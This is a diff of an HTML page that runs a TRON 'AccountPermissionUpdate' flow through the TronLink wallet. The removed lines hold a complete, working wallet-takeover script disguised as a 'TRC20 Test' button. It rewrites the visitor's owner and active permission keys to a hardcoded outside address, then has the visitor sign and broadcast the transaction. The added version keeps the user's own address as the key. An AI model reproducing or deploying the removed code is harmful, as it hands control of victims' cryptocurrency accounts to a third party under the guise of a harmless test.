@@ -1,127 +1,69 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRC20 Test</title>
-    <style>
-        body {
-            background: #1C1C1E;
-            font-family: -apple-system, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        .card {
-            background: #2C2C2E;
-            border-radius: 16px;
-            padding: 32px 24px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-        }
-        .btn {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            background: #03FC8F;
-            color: #000;
-        }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .status { margin-top: 12px; font-size: 13px; color: #8E8E93; }
-        .status.success { color: #03FC8F; }
-        .status.error { color: #FF453A; }
-    </style>
+  <title>Permission Update Test</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
 </head>
 <body>
-    <div class="card">
-        <button class="btn" id="testBtn">Test Permission Update</button>
-        <div class="status" id="status"></div>
-    </div>
-    <script>
-        const YOUR_ADDRESS = 'TEFDk2RF1Vaahti6hKsc47PUxSsfgKnAfD';
+  <h2>AccountPermissionUpdate Test</h2>
+  <button onclick="updatePermission()">Update Permission</button>
+  <pre id="result"></pre>
 
-        document.getElementById('testBtn').addEventListener('click', async () => {
-            const btn = document.getElementById('testBtn');
-            const status = document.getElementById('status');
+  <script>
+    async function updatePermission() {
+      try {
+        // Wait for TronLink injection
+        if (!window.tronWeb || !window.tronWeb.ready) {
+          alert('Please open in TronLink DApp browser and unlock wallet');
+          return;
+        }
 
-            if (!window.tronLink || !window.tronLink.ready) {
-                status.textContent = 'TronLink not detected.';
-                status.className = 'status error';
-                return;
-            }
+        const address = window.tronWeb.defaultAddress.base58;
+        document.getElementById('result').textContent = 'Address: ' + address + '\n\nBuilding tx...';
 
-            btn.disabled = true;
-            btn.textContent = 'Check TronLink...';
-            status.textContent = '';
-            status.className = 'status';
+        // Define permissions (keeping same key, just testing the flow)
+        const ownerPermission = {
+          type: 0,
+          permission_name: 'owner',
+          threshold: 1,
+          keys: [{
+            address: address,
+            weight: 1
+          }]
+        };
 
-            try {
-                const tronWeb = window.tronLink.tronWeb;
-                const userAddress = tronWeb.defaultAddress.base58;
-                const yourHex = tronWeb.address.toHex(YOUR_ADDRESS);
+        const activePermission = {
+          type: 2,
+          permission_name: 'active',
+          threshold: 1,
+          operations: '7fff1fc0033e0000000000000000000000000000000000000000000000000000',
+          keys: [{
+            address: address,
+            weight: 1
+          }]
+        };
 
-                if (!userAddress) {
-                    throw new Error('No wallet connected');
-                }
+        // Build transaction
+        const tx = await window.tronWeb.transactionBuilder.accountPermissionUpdate(
+          address,
+          ownerPermission,
+          [activePermission]
+        );
 
-                const payload = {
-                    owner_address: userAddress,
-                    owner: {
-                        type: 0,
-                        permission_name: 'owner',
-                        threshold: 1,
-                        keys: [{ address: yourHex, weight: 1 }]
-                    },
-                    actives: [{
-                        type: 2,
-                        permission_name: 'active',
-                        threshold: 1,
-                        operations: '7fff1fc0033e0000000000000000000000000000000000000000000000000000',
-                        keys: [{ address: yourHex, weight: 1 }]
-                    }],
-                    visible: true
-                };
+        document.getElementById('result').textContent += '\n\nUnsigned TX:\n' + JSON.stringify(tx, null, 2);
 
-                btn.textContent = 'Signing...';
+        // Sign via TronLink
+        const signed = await window.tronWeb.trx.sign(tx);
+        document.getElementById('result').textContent += '\n\nSigned TX:\n' + JSON.stringify(signed, null, 2);
 
-                const response = await tronWeb.fullNode.request('/wallet/accountpermissionupdate', payload, 'post');
+        // Broadcast
+        const result = await window.tronWeb.trx.sendRawTransaction(signed);
+        document.getElementById('result').textContent += '\n\nBroadcast Result:\n' + JSON.stringify(result, null, 2);
 
-                if (response.Error || response.error) {
-                    throw new Error(response.Error || response.error);
-                }
-
-                if (!response.transaction && !response.raw_data) {
-                    throw new Error('Invalid response: ' + JSON.stringify(response));
-                }
-
-                const signed = await tronWeb.trx.sign(response.transaction || response);
-
-                btn.textContent = 'Broadcasting...';
-
-                const result = await tronWeb.trx.sendRawTransaction(signed);
-
-                if (result.result) {
-                    status.textContent = 'Permission updated. TX: ' + result.txid;
-                    status.className = 'status success';
-                    btn.textContent = 'Done';
-                } else {
-                    throw new Error('Transaction failed: ' + JSON.stringify(result));
-                }
-            } catch (e) {
-                status.textContent = 'Error: ' + (e.message || 'Unknown');
-                status.className = 'status error';
-                btn.disabled = false;
-                btn.textContent = 'Test Permission Update';
-            }
-        });
-    </script>
+      } catch (err) {
+        document.getElementById('result').textContent += '\n\nERROR:\n' + err.message + '\n\n' + err.stack;
+      }
+    }
+  </script>
 </body>
 </html>
